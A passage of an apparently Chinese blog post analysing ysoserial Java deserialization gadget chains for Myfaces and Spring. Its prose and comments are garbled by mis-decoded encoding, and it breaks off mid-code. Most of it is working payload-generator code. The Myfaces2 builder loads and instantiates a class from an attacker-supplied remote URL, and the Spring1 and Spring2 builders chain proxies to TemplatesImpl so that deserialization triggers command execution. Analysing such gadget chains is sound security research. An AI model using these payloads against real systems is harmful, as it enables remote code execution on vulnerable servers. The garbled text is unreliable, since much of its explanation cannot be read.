è§¦å‘åˆ©ç”¨çš„æ¡ä»¶ï¼Œ EL è¡¨è¾¾å¼è§£æå’Œå¤„ç†è¿˜éœ€è¦ç”±å…·ä½“çš„ EL å®ç°ç±»å®Œæˆï¼ˆå¦‚ juel å’Œ apache-elï¼‰ï¼Œå…¶ä¸­çš„ ValueExpressionImpl.getValue å…·ä½“å®ç°å°†è§¦å‘çœŸæ­£çš„ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">makeExpressionPayload</span> <span class="params">( String expr )</span> <span class="keyword">throws</span> IllegalArgumentException, IllegalAccessException, Exception  </span>&#123;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ– FacesContext åŠ ELContext</span></span><br><span class="line">    FacesContextImpl fc = <span class="keyword">new</span> FacesContextImpl((ServletContext) <span class="keyword">null</span>, (ServletRequest) <span class="keyword">null</span>, (ServletResponse) <span class="keyword">null</span>);</span><br><span class="line">    ELContext elContext = <span class="keyword">new</span> FacesELContext(<span class="keyword">new</span> CompositeELResolver(), fc);</span><br><span class="line">    <span class="comment">// ä½¿ç”¨åå°„å°† elContext å†™å…¥ FacesContextImpl ä¸­</span></span><br><span class="line">    Reflections.getField(FacesContextImplBase.class, <span class="string">&quot;_elContext&quot;</span>).set(fc, elContext);</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ ExpressionFactory åˆ›å»º ValueExpression</span></span><br><span class="line">    ExpressionFactory expressionFactory = ExpressionFactory.newInstance();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æœ‰å®³</span></span><br><span class="line">    ValueExpression ve1 = expressionFactory.createValueExpression(elContext, expr, Object.class);</span><br><span class="line">    ValueExpressionMethodExpression e = <span class="keyword">new</span> ValueExpressionMethodExpression(ve1);</span><br><span class="line">    <span class="comment">// æ— å®³</span></span><br><span class="line">    ValueExpression ve2 = expressionFactory.createValueExpression(elContext, <span class="string">&quot;$&#123;true&#125;&quot;</span>, Object.class);</span><br><span class="line">    ValueExpressionMethodExpression e2 = <span class="keyword">new</span> ValueExpressionMethodExpression(ve2);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ„é€  HashMap</span></span><br><span class="line">    <span class="comment">// å…ˆæ”¾å…¥æ— å®³çš„ ValueExpressionï¼Œput åˆ° map ä¹‹åå†åå°„å†™å…¥ valueExpression å­—æ®µ</span></span><br><span class="line">    <span class="comment">// é¿å…æ„é€ è¿‡ç¨‹ä¸­è§¦å‘</span></span><br><span class="line">    <span class="keyword">return</span> Gadgets.makeMap(e2, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§¦å‘æ¡ä»¶çš„æ„é€ åªæ¶‰åŠåˆ° ValueExpressionMethodExpression ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MethodExpression me = <span class="keyword">this</span>.getMethodExpression();   <span class="comment">// è¿™é‡Œ</span></span><br><span class="line">    <span class="keyword">return</span> me != <span class="keyword">null</span> ? me.hashCode() : <span class="keyword">this</span>.valueExpression.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> MethodExpression <span class="title">getMethodExpression</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨å¸¦å‚æ•°çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getMethodExpression(FacesContext.getCurrentInstance().getELContext());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> MethodExpression <span class="title">getMethodExpression</span><span class="params">(ELContext context)</span> </span>&#123;</span><br><span class="line">    Object meOrVe = <span class="keyword">this</span>.valueExpression.getValue(context); <span class="comment">// è¿™é‡Œï¼Œç”±å…·ä½“å®ç°ç±»å®Œæˆ</span></span><br><span class="line">    <span class="keyword">if</span> (meOrVe <span class="keyword">instanceof</span> MethodExpression) &#123;</span><br><span class="line">        <span class="keyword">return</span> (MethodExpression)meOrVe;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(meOrVe <span class="keyword">instanceof</span> ValueExpression)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(meOrVe != <span class="keyword">null</span> &amp;&amp; meOrVe <span class="keyword">instanceof</span> ValueExpression) &#123;</span><br><span class="line">            meOrVe = ((ValueExpression)meOrVe).getValue(context);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (MethodExpression)meOrVe;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Myfaces2"><a href="#Myfaces2" class="headerlink" title="Myfaces2"></a>Myfaces2</h2><blockquote><p>åˆ©ç”¨é“¾åŒ Myfaces1<br>åœ¨ Myfaces1 çš„åŸºç¡€ä¸Šä½¿ç”¨ ClassLoader è¿œç¨‹åŠ è½½æ¶æ„ç±»çš„ EL è¡¨è¾¾å¼æ‰§è¡Œä»£ç ï¼Œå³æä¾›æ„é€  EL</p></blockquote><p>ysoserial.payloads.Myfaces2#getObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Command format is: &lt;base_url&gt;:&lt;classname&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String url = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">    String className = command.substring(sep + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// based on http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/</span></span><br><span class="line">    String expr = <span class="string">&quot;$&#123;request.setAttribute(&#x27;arr&#x27;,&#x27;&#x27;.getClass().forName(&#x27;java.util.ArrayList&#x27;).newInstance())&#125;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we add fewer than the actual classloaders we end up with a null entry</span></span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ ) &#123;</span><br><span class="line">        expr += <span class="string">&quot;$&#123;request.getAttribute(&#x27;arr&#x27;).add(request.servletContext.getResource(&#x27;/&#x27;).toURI().create(&#x27;&quot;</span> + url + <span class="string">&quot;&#x27;).toURL())&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    expr += <span class="string">&quot;$&#123;request.getClass().getClassLoader().newInstance(request.getAttribute(&#x27;arr&#x27;)&quot;</span></span><br><span class="line">            + <span class="string">&quot;.toArray(request.getClass().getClassLoader().getURLs())).loadClass(&#x27;&quot;</span> + className + <span class="string">&quot;&#x27;).newInstance()&#125;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Myfaces1.makeExpressionPayload(expr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h2><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>spring-core:4.1.4.RELEASE</li><li>spring-beans:4.1.4.RELEASE</li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.findMethod()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.invokeMethod()</span><br><span class="line">Method.invoke()</span><br><span class="line">Templates(Proxy).newTransformer()</span><br><span class="line">AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()</span><br><span class="line">ObjectFactory(Proxy).getObject()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">Method.invoke()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br><span class="line">TemplatesImpl.defineTransletClasses()</span><br><span class="line">TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="line">Pwner*(Javassist-generated).&lt;static init&gt;</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/186GzSMsLyuAnil.png" ><p>ysoserial.payloads.Spring1#getObject é€šè¿‡ MethodInvokeTypeProvider.readObject è§¦å‘æ–¹æ³•è°ƒç”¨ï¼Œæ–¹æ³•ç”± ObjectFactoryDelegatingInvocationHandler ä»£ç†ï¼Œæœ€ç»ˆè°ƒç”¨ TemplatesImpl.newTransformer ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æ„é€  TemplatesImpl æ‰¿è½½æ¶æ„æŒ‡ä»¤</span></span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€  HashMap æ‰¿è½½ TemplatesImpl</span></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ AnnotationInvocationHandler åŠ¨æ€ä»£ç† ObjectFactory çš„ getObject æ–¹æ³•ï¼Œè¿”å› TemplatesImpl</span></span><br><span class="line"><span class="keyword">final</span> ObjectFactory objectFactoryProxy =</span><br><span class="line">Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;getObject&quot;</span>, templates), ObjectFactory.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ objectFactoryProxy å®ä¾‹åŒ– ObjectFactoryDelegatingInvocationHandlerï¼Œä»£ç† Type å’Œ Templatesï¼ˆTemplatesImpl çˆ¶ç±»ï¼‰</span></span><br><span class="line">    <span class="keyword">final</span> Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)</span><br><span class="line">Reflections.getFirstCtor(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>)</span><br><span class="line">.newInstance(objectFactoryProxy), Type.class, Templates.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»£ç† TypeProvider çš„ getType æ–¹æ³•ï¼Œè¿”å› typeTemplatesProxy ä»£ç†ç±»</span></span><br><span class="line">    <span class="keyword">final</span> Object typeProviderProxy = Gadgets.createMemoitizedProxy(</span><br><span class="line">Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),</span><br><span class="line">forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç”¨ typeProviderProxy åˆå§‹åŒ– MethodInvokeTypeProvider</span></span><br><span class="line">    <span class="keyword">final</span> Constructor mitpCtor = Reflections.getFirstCtor(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">    <span class="comment">// ç”±äº MethodInvokeTypeProvider åˆå§‹åŒ–æ—¶ä¼šç«‹å³è°ƒç”¨  ReflectionUtils.invokeMethod(method, provider.getType())</span></span><br><span class="line"><span class="comment">// æ‰€ä»¥åˆå§‹åŒ–æ—¶éšä¾¿ç»™ä¸ª Methodï¼ŒmethodName</span></span><br><span class="line"><span class="keyword">final</span> Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>, <span class="keyword">new</span> Class[] &#123;&#125;), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ©ç”¨åå°„èµ‹å€¼ï¼Œè°ƒç”¨ newTransformer æ–¹æ³•</span></span><br><span class="line">Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mitp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Spring æ ¸å¿ƒåŒ…ä¸­çš„ <code>org.springframework.core.SerializableTypeWrapper$TypeProvider</code> å®ç°äº† TypeProvider æ¥å£ï¼Œæ˜¯ä¸€ä¸ªå¯ä»¥è¢«ååºåˆ—åŒ–çš„ç±»ã€‚ååºåˆ—åŒ–æ—¶è°ƒç”¨äº† ReflectionUtilsï¼Œå…ˆæ˜¯ findMethod è¿”å› Method å¯¹è±¡ç„¶åç´§æ¥ç€è°ƒç”¨ invokeMethod è¿›è¡Œåå°„è°ƒç”¨ï¼ˆæ— å‚è°ƒç”¨ï¼‰ã€‚</p><p><code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code> æ˜¯ InvocationHandler çš„å®ç°ç±»ï¼Œå®ä¾‹åŒ–æ—¶æ¥æ”¶ä¸€ä¸ª ObjectFactory å¯¹è±¡ï¼Œå¹¶åœ¨ invoke ä»£ç†æ—¶è°ƒç”¨ ObjectFactory çš„ getObject æ–¹æ³•è¿”å› ObjectFactory çš„å®ä¾‹ç”¨äº Method çš„åå°„è°ƒç”¨ã€‚</p><ul><li>ä½¿ç”¨ AnnotationInvocationHandler ä»£ç†ï¼Œè¿”å›ä»»æ„å¯¹è±¡</li><li>ä½¿ç”¨ ObjectFactoryDelegatingInvocationHandler ä»£ç† TypeProvider$getType æ–¹æ³•</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MethodInvokeTypeProvider</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodInvokeTypeProvider</span> <span class="keyword">implements</span> <span class="title">SerializableTypeWrapper</span>.<span class="title">TypeProvider</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableTypeWrapper.TypeProvider provider;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String methodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object result;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MethodInvokeTypeProvider</span><span class="params">(SerializableTypeWrapper.TypeProvider provider, Method method, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.provider = provider;</span><br><span class="line">        <span class="keyword">this</span>.methodName = method.getName();</span><br><span class="line">        <span class="keyword">this</span>.index = index;</span><br><span class="line">        <span class="keyword">this</span>.result = ReflectionUtils.invokeMethod(method, provider.getType());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !(<span class="keyword">this</span>.result <span class="keyword">instanceof</span> Type) &amp;&amp; <span class="keyword">this</span>.result != <span class="keyword">null</span> ? ((Type[])((Type[])<span class="keyword">this</span>.result))[<span class="keyword">this</span>.index] : (Type)th</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        inputStream.defaultReadObject();</span><br><span class="line">        Method method = ReflectionUtils.findMethod(<span class="keyword">this</span>.provider.getType().getClass(), <span class="keyword">this</span>.methodName);</span><br><span class="line">        <span class="keyword">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="keyword">this</span>.provider.getType());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ObjectFactoryDelegatingInvocationHandler</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectFactoryDelegatingInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ObjectFactory&lt;?&gt; objectFactory;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ObjectFactoryDelegatingInvocationHandler</span><span class="params">(ObjectFactory&lt;?&gt; objectFactory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.objectFactory = objectFactory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        String methodName = method.getName();</span><br><span class="line">        <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> proxy == args[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> System.identityHashCode(proxy);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.objectFactory.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// è°ƒç”¨ ObjectFactory çš„ getObject æ–¹æ³•è¿”å› ObjectFactory çš„å®ä¾‹ç”¨äº Method çš„åå°„è°ƒç”¨</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.objectFactory.getObject(), args);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var6.getTargetException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h2><blockquote><p>ä½¿ç”¨ spring-aop çš„ JdkDynamicAopProxy æ›¿æ¢äº† spring-beans çš„ ObjectFactoryDelegatingInvocationHandler</p></blockquote><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.findMethod()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.invokeMethod()</span><br><span class="line">Method.invoke()</span><br><span class="line">Templates(Proxy).newTransformer()</span><br><span class="line">                        JdkDynamicAopProxy.invoke()</span><br><span class="line">                            AopUtils.invokeJoinpointUsingReflection()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/xtW6eHdnbGPrYyJ.png" ><p>ysoserial.payloads.Spring2#getObject å’Œ Spring1 çš„æ„é€ æ–¹å¼åŸºæœ¬ç›¸åŒï¼Œè¿™é‡Œç”¨äº† AdvisedSupport å®ä¾‹åŒ– JdkDynamicAopProxy åŠ¨æ€ä»£ç†ï¼Œåœ¨ MethodInvokeTypeProvider.readObject ä¸­è¿”å› TemplatesImpl å’Œæ–¹æ³• newTransformerï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æ„é€  TemplatesImpl æ‰¿è½½æ¶æ„æŒ‡ä»¤</span></span><br><span class="line">    <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®ä¾‹åŒ– AdvisedSupport</span></span><br><span class="line">    AdvisedSupport as = <span class="keyword">new</span> AdvisedSupport();</span><br><span class="line">    as.setTargetSource(<span class="keyword">new</span> SingletonTargetSource(templates));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ JdkDynamicAopProxy åŠ¨æ€ä»£ç†ï¼Œä»£ç† Type å’Œ Templatesï¼ˆTemplatesImpl çˆ¶ç±»ï¼‰</span></span><br><span class="line">    <span class="keyword">final</span> Type typeTemplatesProxy = Gadgets.createProxy(</span><br><span class="line">        (InvocationHandler) Reflections.getFirstCtor(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).newInstance(as),</span><br><span class="line">        Type.class,</span><br><span class="line">        Templates.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»£ç† TypeProvider çš„ getType æ–¹æ³•ï¼Œè¿”å› typeTemplatesProxy ä»£ç†ç±»</span></span><br><span class="line">    <span class="keyword">final</span> Object typeProviderProxy = Gadgets.createMemoitizedProxy(</span><br><span class="line">        Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),</span><br><span class="line">        forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ– MethodInvokeTypeProvider</span></span><br><span class="line">    Object mitp = Reflections.createWithoutConstructor(forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// åˆ©ç”¨åå°„èµ‹å€¼ï¼Œä½¿ç”¨ typeProviderProxy ä»£ç†ç±» å’Œ newTransformer æ–¹æ³•</span></span><br><span class="line">    Reflections.setFieldValue(mitp, <span class="string">&quot;provider&quot;</span>, typeProviderProxy);</span><br><span class="line">    Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mitp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ AopUtils#invokeJoinpointUsingReflection() æ–¹æ³•åå°„è°ƒç”¨å¯¹è±¡çš„ method æ–¹æ³•å¹¶è¿”å›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 